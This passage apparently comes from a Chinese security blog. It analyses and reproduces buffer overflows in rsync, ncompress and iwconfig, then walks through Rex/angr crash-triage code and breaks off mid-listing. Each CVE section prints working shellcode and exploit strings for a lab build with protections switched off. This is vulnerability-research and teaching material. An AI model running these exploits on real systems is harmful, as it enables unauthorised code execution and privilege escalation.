environment RSYNC_PROXY=PoC 将 PoC 传入。</p><p>在 &lt; open_socket_out+229 > 处设置断点，即溢出点前。查看程序运行状态如下：</p><p><img src="/2019/03/19/CVE-2004-2093/stack_min.png" alt="">  </p><p>使用命令 “ni” 单步执行，触发溢出。  </p><p><img src="/2019/03/19/CVE-2004-2093/stack_smash_min.png" alt=""></p><p>可见，RIP 被覆盖为 0x0000424242424242。执行至 open_socket_out() 返回，触发异常：  </p><p><img src="/2019/03/19/CVE-2004-2093/crash_min.png" alt=""></p><p>控制流已被成功劫持。完整过程如下：  </p><p><img src="/2019/03/19/CVE-2004-2093/PoC_min.gif" alt="">  </p><h2 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h2><p>通过 ret2text 的方式，在实验环境下实现任意代码执行。</p><h3 id="1、实验环境"><a href="#1、实验环境" class="headerlink" title="1、实验环境"></a>1、实验环境</h3><p>修改原 Makefile 文件中的 gcc 选项，关闭安全机制：  </p><p><img src="/2019/03/19/CVE-2004-2093/gcc_min.png" alt=""></p><p>checksec 结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">'/root/AEG_DataSet/rsync-2.5.7/rsync'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p><p>使用 shellcode 如下，功能为调用 /bin/bash，共计 24 字节。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 调用 /bin/bash (<span class="number">24</span> byte)</span><br><span class="line">shellcode = <span class="string">'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'</span></span><br></pre></td></tr></table></figure></p><h3 id="2、GDB"><a href="#2、GDB" class="headerlink" title="2、GDB"></a>2、GDB</h3><p>基于上文分析，使用 retAddr = 0x7fffffffe1fe，构造 Exp 如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'AAAA:'</span> + <span class="string">'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'</span> + <span class="string">'A'</span>*98 + <span class="string">'\xfe\xe1\xff\xff\xff\x7f'</span><span class="string">")</span></span><br></pre></td></tr></table></figure></p><p>使用 export 命令将 Exp 写入环境变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> RSYNC_PROXY=<span class="string">"`python -c 'print "</span>AAAA:<span class="string">"+"</span>\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05<span class="string">" + "</span>A<span class="string">"*98 + "</span>\xfe\xe1\xff\xff\xff\x7f<span class="string">"'`"</span></span><br></pre></td></tr></table></figure></p><p>使用 GDB 加载并执行 rsync，在 &lt; open_socket_out+234 > 处设置断点，并查看程序状态：</p><p><img src="/2019/03/19/CVE-2004-2093/gdb_exp_stack_min.png" alt=""></p><p>执行至 open_socket_out() 返回，控制流被劫持，跳转至 shellcode 并执行。  </p><p><img src="/2019/03/19/CVE-2004-2093/gdb_shellcode_min.png" alt=""></p><p>至此，完成了对 CVE-2004-2093 的分析，并在实验环境下编写了 Exploit。</p><h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><ol><li><a href="https://rsync.samba.org/download.html" target="_blank" rel="noopener">rsync download</a></li><li><a href="https://download.samba.org/pub/rsync/rsync.html" target="_blank" rel="noopener">rsync doc</a></li><li><a href="https://www.cvedetails.com/cve/CVE-2004-2093/" target="_blank" rel="noopener">Vulnerability Details : CVE-2004-2093</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CVE-2001-1413(nCompress) 缓冲区溢出漏洞分析及复现</title>
      <link href="/2019/03/15/CVE-2001-1413/"/>
      <url>/2019/03/15/CVE-2001-1413/</url>
      
        <content type="html"><![CDATA[<p>Compress is a fast, simple LZW file compressor. Compress does not have the highest compression rate, but it is one of the fastest programs to compress data. Compress is the defacto standard in the UNIX community for compressing files.</p><a id="more"></a><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Stack-based buffer overflow in the comprexx function for ncompress 4.2.4 and earlier, when used in situations that cross security boundaries (such as FTP server), may allow remote attackers to execute arbitrary code via a long filename argument.</p><ul><li>CVE Details<br><img src="/2019/03/15/CVE-2001-1413/CVE-details_min.png" alt=""></li></ul><h2 id="0x01-CVE-2001-1413-漏洞原理"><a href="#0x01-CVE-2001-1413-漏洞原理" class="headerlink" title="0x01 CVE-2001-1413 漏洞原理"></a>0x01 CVE-2001-1413 漏洞原理</h2><h3 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h3><p>溢出点位于 compress42.c 中的 comprexx() 函数内。 *fileptr 为传入的文件名，数组 tempname[MAXPATHLEN] 的大小为 1024 字节。</p><p><img src="/2019/03/15/CVE-2001-1413/code_min.png" alt=""></p><h3 id="2、汇编"><a href="#2、汇编" class="headerlink" title="2、汇编"></a>2、汇编</h3><p>查看汇编代码，编译时为 comprexx() 分配的空间为 0x550，变量 tempname 起始地址为 rbp-0x410。因此，构造 PoC： ‘A’ * 1040 + RBP + RIP，即可导致程序崩溃。</p><p><img src="/2019/03/15/CVE-2001-1413/asm_min.png" alt=""></p><h3 id="3、Debug"><a href="#3、Debug" class="headerlink" title="3、Debug"></a>3、Debug</h3><p>基于以上分析，构造 PoC 为 python -c ‘print “A”*1054’，将程序断至 &lt; comprexx+41 &gt; 处：</p><p><img src="/2019/03/15/CVE-2001-1413/stack_min.png" alt=""></p><p>单步执行，触发漏洞。此时，RSP=0x7fffffffd960、RBP=0x7fffffffdeb0，查看 RBP 附近：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x7fffffffde60</span><br><span class="line">0x7fffffffde60:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffde70:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffde80:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffde90:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffdea0:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffdeb0:0x41414141414141410x0000414141414141</span><br><span class="line">0x7fffffffdec0:0x00007ffff7de59a00x000000000074a260</span><br><span class="line">0x7fffffffded0:0x00000000004036600x0000000000000000</span><br><span class="line">0x7fffffffdee0:0x0000000000400d200x00007fffffffdfd0</span><br><span class="line">0x7fffffffdef0:0x00000000004036600x00007ffff7a05b97</span><br></pre></td></tr></table></figure><p>可见，RBP 被覆盖为 0x4141414141414141，RIP 被覆盖为 0x0000414141414141。执行至函数返回：  </p><p><img src="/2019/03/15/CVE-2001-1413/crash_min.png" alt=""></p><h2 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h2><p>本文侧重点在于分析漏洞成因，不过多涉及 Exploit 编写技术。在此选用 ret2text 的方式，仅以验证为目的。</p><h3 id="1、实验环境"><a href="#1、实验环境" class="headerlink" title="1、实验环境"></a>1、实验环境</h3><p>将源码中的 Makefile.def 重命名为 Makefile，并修改 GCC 配置：  </p><p><img src="/2019/03/15/CVE-2001-1413/gcc_min.png" alt=""></p><p>checksec 结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/root/AEG_DataSet/ncompress-4.2.4/compress'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p><p>使用 shellcode 如下，功能为调用 /bin/bash，共计 24 字节。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 调用 /bin/bash (<span class="number">24</span> byte)</span><br><span class="line">shellcode = <span class="string">'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'</span></span><br></pre></td></tr></table></figure></p><h3 id="2、GDB"><a href="#2、GDB" class="headerlink" title="2、GDB"></a>2、GDB</h3><p>基于以上分析可知，偏移量为 1048，使用 0x7fffffffdaa0 作为返回地址，构造 Exp 如下：<br>(python -c “print ‘\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05’ + ‘A’*1024 + ‘\xa0\xda\xff\xff\xff\x7f’”)。  </p><p>将 Exploit 传入 GDB，并触发漏洞：  </p><p><img src="/2019/03/15/CVE-2001-1413/gdb_exp_min.png" alt=""></p><p>执行至函数返回，成功劫持控制流，并执行 shellcode。  </p><p><img src="/2019/03/15/CVE-2001-1413/gdb_shellcode_min.png" alt=""></p><p>至此，完成了对 CVE-2001-1413 的分析，并在实验环境下编写了 Exploit。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol><li><a href="http://ncompress.sourceforge.net" target="_blank" rel="noopener">ncompress</a></li><li><a href="https://www.cvedetails.com/cve/CVE-2001-1413/" target="_blank" rel="noopener">Vulnerability Details : CVE-2001-1413</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CVE-2003-0947(iwconfig)缓冲区溢出分析及复现</title>
      <link href="/2019/03/14/CVE-2003-0947/"/>
      <url>/2019/03/14/CVE-2003-0947/</url>
      
        <content type="html"><![CDATA[<p>iwconfig 是 Linux Wireless Extensions(LWE) 的用户层配置工具之一。LWE 是 Linux 下对无线网络配置的工具，包括内核的支持、用户层配置工具和驱动接口的支持三部分。<br>目前很多无线网卡都支持 LWE，而且主流的 Linux 发布版本，比如 Redhat Linux、Ubuntu Linux 都已经带了这个配置工具。</p><p align="right"> –《百度百科》 </p><a id="more"></a><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>待分析的 iwconfig V.26 存在两个漏洞，分别为 CVE-2003-0947、CVE-2003-0948。此次主要对 CVE-2003-0947 进行分析。</p><p><img src="/2019/03/14/CVE-2003-0947/iwconfig-cve_min.png" alt="">  </p><p>漏洞描述如下：</p><p>Buffer overflow in iwconfig, when installed setuid, allows local users to execute arbitrary code via a long OUT environment variable.</p><ul><li><p>CVSS 评分：<br><img src="/2019/03/14/CVE-2003-0947/CVSS_min.png" alt=""></p></li><li><p>影响版本：<br><img src="/2019/03/14/CVE-2003-0947/scope_min.png" alt=""></p></li></ul><h2 id="0x01-CVE-2003-0947-漏洞原理"><a href="#0x01-CVE-2003-0947-漏洞原理" class="headerlink" title="0x01 CVE-2003-0947 漏洞原理"></a>0x01 CVE-2003-0947 漏洞原理</h2><h3 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h3><p>导致漏洞产生的原因是，位于 iwconfig.c 中的 get_info() 函数在调用 strcpy() 时，未检查缓冲区大小，导致栈溢出。如下图所示，蓝色箭头表示从 main() 函数开始至溢出点的函数调用过程，红色箭头表示输入数据的传递过程，左下方绿色区域为结构体 ifreq 定义，右下方为 iw_get_ext() 函数体。</p><p><img src="/2019/03/14/CVE-2003-0947/code_min.jpg" alt=""></p><p>对溢出点 strcpy(ifr.ifr_name, ifname) 进行分析。ifname 为输入参数 argv[1] 传递所得，在整个传参过程中，程序未对其进行任何检查。查看系统对结构体 ifreq 的定义，可见 ifr.ifr_name 的大小为 16 字节。意味着，只要使得输入参数 argv[1] 远大于 16 字节，即可造成缓冲区溢出，使程序崩溃。<br>注意：在到达溢出点前，需要调用 iw_get_ext(skfd, ifname, SIOCGIWNAME, &amp;wrq) 函数，由于传入的 ifname 为无意义数据，使得 iw_get_ext(skfd, ifname, SIOCGIWNAME, &amp;wrq) 返回值为 -1，因此能够进入存在漏洞的分支路径中。</p><h3 id="2、汇编"><a href="#2、汇编" class="headerlink" title="2、汇编"></a>2、汇编</h3><p>基于汇编代码，对溢出点进一步分析。由下图可知，系统为 get_info() 分配空间 0x70，ifr.ifr_name 所在地址为 rbp-0x50。因此，构造 PoC 为 ‘A’ * 80 + ‘RBP’ + ‘RIP’，即可导致程序崩溃。  </p><p><img src="/2019/03/14/CVE-2003-0947/asm_min.png" alt=""></p><h3 id="3、Debug"><a href="#3、Debug" class="headerlink" title="3、Debug"></a>3、Debug</h3><p>基于以上分析，构造 PoC 为 python -c ‘print “A”*88 + “BBBBBB”‘，并通过 GDB 进行验证。<br>在 &lt; get_info + 82 > 处设置断点，即溢出点前：</p><p><img src="/2019/03/14/CVE-2003-0947/stack_min.png" alt="">  </p><p>此时，RSP=0x7fffffffdf80、RBP=0x7fffffffdff0，ifr.ifr_name 地址为 0x7fffffffdfa0，查看栈空间如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffdf80:0x00000000ffffffff0x00007fffffffe020</span><br><span class="line">0x7fffffffdf90:0x00007fffffffe7470x00000003f7fe74e0</span><br><span class="line">0x7fffffffdfa0:0x00007fffffffe3d00x0000000000401010</span><br><span class="line">0x7fffffffdfb0:0x00007fffffffe4e00x0000000000000000</span><br><span class="line">0x7fffffffdfc0:0x00000000000000000x00007ffff7de4ec3</span><br><span class="line">0x7fffffffdfd0:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffdfe0:0x00007fffffffe4000x0000000000401010</span><br><span class="line">0x7fffffffdff0:0x00007fffffffe3d00x000000000040244b</span><br><span class="line">0x7fffffffe000:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffe010:0x00007fffffffe7470x0000000300000000</span><br></pre></td></tr></table></figure><p>单步调试至触发溢出。  </p><p><img src="/2019/03/14/CVE-2003-0947/stack_smash_min.png" alt=""></p><p>再次查看栈空间，可见 0x7fffffffdff0 处的 RBP 已被覆盖为 0x4141414141414141，0x7fffffffdff8 处的 RIP 被覆盖为 0x0000424242424242。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffdf80:0x00000000ffffffff0x00007fffffffe020</span><br><span class="line">0x7fffffffdf90:0x00007fffffffe7470x00000003f7fe74e0</span><br><span class="line">0x7fffffffdfa0:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffdfb0:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffdfc0:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffdfd0:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffdfe0:0x41414141414141410x4141414141414141</span><br><span class="line">0x7fffffffdff0:0x41414141414141410x0000424242424242</span><br><span class="line">0x7fffffffe000:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffe010:0x00007fffffffe7470x0000000300000000</span><br></pre></td></tr></table></figure><p>执行至 get_info() 返回，抛出异常，RIP 已被劫持为 0x424242424242。</p><p><img src="/2019/03/14/CVE-2003-0947/crash_min.png" alt="">  </p><h2 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h2><p>本文侧重点在于分析漏洞成因，不过多涉及 Exploit 编写技术。在此选用 ret2text 的方式，仅以验证为目的。</p><h3 id="1、实验环境"><a href="#1、实验环境" class="headerlink" title="1、实验环境"></a>1、实验环境</h3><p>修改原 Makefile 文件中的 gcc 选项，关闭安全机制：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CFLAGS=-O2 -W -Wall -Wstrict-prototypes</span></span><br><span class="line">CFLAGS=-W -Wall -g -z execstack -fno-stack-protector -no-pie -z norelro</span><br></pre></td></tr></table></figure><ul><li>-O2 选项会对代码进行优化，在 gcc 7.3.0 下会开启 FORTIFY，因此关闭该选项  </li><li>-z execstack，关闭 NX  </li><li>-fno-stack-protector，关闭 Canary  </li><li>-no-pie，关闭 PIE  </li><li>-z norelro，关闭 RELRO  </li><li>-g， Debug 模式</li></ul><p>checksec 结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec iwconfig</span><br><span class="line">[*] <span class="string">'/root/AEG_DataSet/wireless_tools.26/iwconfig'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p><p>使用 shellcode 如下，功能为调用 /bin/bash，共计 24 字节。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 调用 /bin/bash (<span class="number">24</span> byte)</span><br><span class="line">shellcode = <span class="string">'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'</span></span><br></pre></td></tr></table></figure></p><h3 id="2、GDB"><a href="#2、GDB" class="headerlink" title="2、GDB"></a>2、GDB</h3><p>基于以上分析可知，ifr.ifr_name 地址为 0x7fffffffdfa0，与 RIP 之间的偏移量为 88，使用 0x7fffffffdfa0 作为返回地址，构造 Exp 如下：<br>(python -c “print ‘\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05’ + ‘A’*64 + ‘\xa0\xdf\xff\xff\xff\x7f\x00\x00’”)。<br>将 Exploit 传入 GDB，并触发漏洞：  </p><p><img src="/2019/03/14/CVE-2003-0947/gdb_exp_min.png" alt=""></p><p>执行至 get_info() 返回，成功劫持控制流，并执行 shellcode。  </p><p><img src="/2019/03/14/CVE-2003-0947/gdb_exp_success_min.png" alt=""></p><p>至此，完成了对 CVE-2003-0947 的分析，并在实验环境下编写了 Exploit。</p><h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><ol><li><a href="https://hewlettpackard.github.io/wireless-tools/Tools.html" target="_blank" rel="noopener">iwconfig V.26下载地址</a></li><li><a href="https://www.cvedetails.com/cve/CVE-2003-0947/" target="_blank" rel="noopener">Vulnerability Details : CVE-2003-0947</a></li><li><a href="https://www.securityfocus.com/bid/82721/info" target="_blank" rel="noopener">SecurityFocus: iwconfig CVE-2003-0947 Local Security Vulnerability</a></li><li><a href="https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制/" target="_blank" rel="noopener">linux程序的常用保护机制</a>  </li><li><a href="https://www.exploit-db.com/exploits/23301" target="_blank" rel="noopener">Wireless Tools 26 (IWConfig) - ARGV Local Command Line Buffer Overflow</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Rex：源码分析 -- Crash Analysis</title>
      <link href="/2019/01/23/rex-crash/"/>
      <url>/2019/01/23/rex-crash/</url>
      
        <content type="html"><![CDATA[<p>本文用以梳理 Rex 复现、分析 Crash 时的原理及工程实现。相关代码，位于 Crash 类中。复现原理，论文中描述如下：</p><hr><p><strong>Vulnerable States.</strong> Unlike AEG/Mayhem, but similar to AXGEN, we generate exploits by performing concolic execution on crashing program inputs using angr. We drive concolic execution forward, forcing it to follow the same path as a dynamic trace gathered by concretely executing the crashing input applied to the program. Concolic execution is stopped at the point where the program crashed, and we inspect the symbolic state to determine the cause of the crash and measure exploitability. By counting the number of symbolic bits in certain registers, we can triage a crash into a number of categories such as <em>frame pointer overwrite, instruction pointer overwrite, or arbitrary write,</em> among others.  </p><a id="more"></a><p>不难看出关键词为 “concolic execution”，即混合符号执行。通过 concolic-execution 将程序从初始状态引导至 Crash 状态，以 EIP 中符号变量的数量为依据，实现对漏洞类型的判定。</p><h2 id="0x00-Concrete-Execution"><a href="#0x00-Concrete-Execution" class="headerlink" title="0x00 Concrete Execution"></a>0x00 Concrete Execution</h2><p>Concolic Execution 原理本文不做详细介绍。Rex 在实现过程中，首先通过 QEMU，加载二进制程序及 PoC，以 Concrete Execution 的方式得到 crash_state。Rex 调用 <a href="https://github.com/angr/tracer" target="_blank" rel="noopener">Tracer</a> 模块实现相关功能。<br><img src="/2019/01/23/rex-crash/Tracer.png" alt=""><br>如同 Tracer 文档中所说一样，Tracer 原本用以辅助 Angr 实现 Concolic tracing，但随着 Angr 的迭代升级，已将相关功能集成在自身之中。Rex 在调用 Tracer 时，也仅使用其中的 QEMURunner() 方法，完成 Concrete Execution。crash.py 中相关代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tracer_args=&#123;</span><br><span class="line"><span class="string">'ld_linux'</span>: os.path.join(bin_location, <span class="string">'tests/i386/ld-linux.so.2'</span>),</span><br><span class="line"><span class="string">'library_path'</span>: os.path.join(bin_location, <span class="string">'tests/i386'</span>)&#125;</span><br><span class="line">r = tracer.QEMURunner(binary=binary, input=input_data, argv=argv, trace_timeout=trace_timeout, **tracer_args)</span><br></pre></td></tr></table></figure></p><h2 id="0x01-Concolic-Execution"><a href="#0x01-Concolic-Execution" class="headerlink" title="0x01 Concolic Execution"></a>0x01 Concolic Execution</h2><p>在获取到 Crash 状态之后，以 Concrete-Execution 结果为引导，将程序执行路径限定在存在 Crash 的路径上，并在该路径上进行符号执行。由于 Angr 基于 UC-KLEE 所提出的 under-constrained symbolic execution(UCSE) 所实现，因此约束条件及初始状态的设定、路径探索的策略、分析技术的选取对最终结果具有重要影响。</p><h3 id="1、simulation-manager"><a href="#1、simulation-manager" class="headerlink" title="1、simulation_manager()"></a>1、simulation_manager()</h3><p>simulation_manager 是 Angr 的核心概念之一。 Rex 中的设置如下，其中 r.crash_mode 为布尔值 “True/False”：<br><img src="/2019/01/23/rex-crash/sm.png" alt=""></p><p>通过 full_init_state()方法，配置程序的初始状态：<br><img src="/2019/01/23/rex-crash/full_init_state.png" alt=""><br><img src="/2019/01/23/rex-crash/initial_state_code.png" alt=""></p><p>full_init_state()中所设置参数的含义如下，定义在<code>./angr/sim_options.py</code>中：</p><ul><li><strong>mode = ‘tracing’</strong><br><img src="/2019/01/23/rex-crash/mode.png" alt=""></li></ul><ul><li><strong>add_options:</strong></li></ul><table><thead><tr><th>Option name</th><th>Description</th></tr></thead><tbody><tr><td>so.MEMORY_SYMBOLIC_BYTES_MAP</td><td>Maintain a mapping of symbolic variable to which memory address it “really” corresponds to, at the paged memory level?</td></tr><tr><td>so.TRACK_ACTION_HISTORY</td><td>track the history of actions through a path (multiple states). This action affects things on the angr level</td></tr><tr><td>so.CONCRETIZE_SYMBOLIC_WRITE_SIZES</td><td>Concretize the sizes of symbolic writes to memory</td></tr><tr><td>so.CONCRETIZE_SYMBOLIC_FILE_READ_SIZES</td><td>Concreteize the sizes of file reads</td></tr><tr><td>so.TRACK_MEMORY_ACTIONS</td><td>Keep a SimAction for each memory read and write</td></tr></tbody></table><ul><li><strong>remove_options:</strong><br>由于 ‘tracing’ 模式下预制了一些选项，因此在优化策略时，不仅需要add_options，而且需要 remove_options。</li></ul><table><thead><tr><th>Option name</th><th>Description</th></tr></thead><tbody><tr><td>so.TRACK_REGISTER_ACTIONS</td><td>Keep a SimAction for each register read and write</td></tr><tr><td>so.TRACK_TMP_ACTIONS</td><td>Keep a SimAction for each temporary variable read and write</td></tr><tr><td>so.TRACK_JMP_ACTIONS</td><td>Keep a SimAction for each jump or branch</td></tr><tr><td>so.ACTION_DEPS</td><td>Track dependencies in SimActions</td></tr><tr><td>so.TRACK_CONSTRAINT_ACTIONS</td><td>Keep a SimAction for each constraint added</td></tr><tr><td>so.LAZY_SOLVES</td><td>Don’t check satisfiability until absolutely necessary</td></tr><tr><td>so.SIMPLIFY_MEMORY_WRITES</td><td>Run values stored to memory through z3’s simplification</td></tr><tr><td>so.ALL_FILES_EXIST</td><td>Attempting to open an unkown file will result in creating it with a symbolic length</td></tr></tbody></table><p>通过full_init_state()，设置约束条件。<br><img src="/2019/01/23/rex-crash/libc.png" alt=""></p><h3 id="2、-state-register-plugin"><a href="#2、-state-register-plugin" class="headerlink" title="2、 state_register_plugin()"></a>2、 state_register_plugin()</h3><p>Program State 是 Angr 中的另一个核心概念。state 在工程实现时，采用插件式的架构，可以根据分析任务的不同，针对性的选用最适合的插件。Rex 默认选用了’posix’、’preconstrainer’ 插件，代码如下图所示。插件源码位于<code>./angr/state_plugins/</code>目录下。<br><img src="/2019/01/23/rex-crash/register_plugin.png" alt=""></p><ul><li><p>SimSystemPosix()<br>Data storage and interaction mechanisms for states with an environment conforming to posix.<br>Available as <code>state.posix</code>.</p></li><li><p>SimStatePreconstrainer()<br>This state plugin manages the concept of preconstraining - adding constraints which you would like to remove later.<br>:param constrained_addrs : SimActions for memory operations whose addresses should be constrained during crash analysis</p></li></ul><h3 id="3、-exploration-techniques"><a href="#3、-exploration-techniques" class="headerlink" title="3、 exploration_techniques()"></a>3、 exploration_techniques()</h3><p>路径搜索策略，在符号执行中具有至关重要的作用。由于 Rex 在复现 Crash 的过程中采用 concolic-execution 方式，因此使用了 ‘Tracer’、’Oppologist’ 两种路径搜索策略。<br><img src="/2019/01/23/rex-crash/et.png" alt=""><br>源码在<code>./angr/exploration_techniques/</code>目录下，调用代码如下：<br><img src="/2019/01/23/rex-crash/explore_tech.png" alt=""></p><ul><li><p>Tracer<br><img src="/2019/01/23/rex-crash/et-tracer.png" alt=""></p></li><li><p>Oppologist<br>The Oppologist is an exploration technique that forces uncooperative code through QEMU.</p></li></ul><h2 id="0x03-Triage"><a href="#0x03-Triage" class="headerlink" title="0x03 Triage"></a>0x03 Triage</h2><p>_triage_crash() 中根据 eip、ebp 中符号变量的个数，及发生崩溃时的操作，定义了七种漏洞类型。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 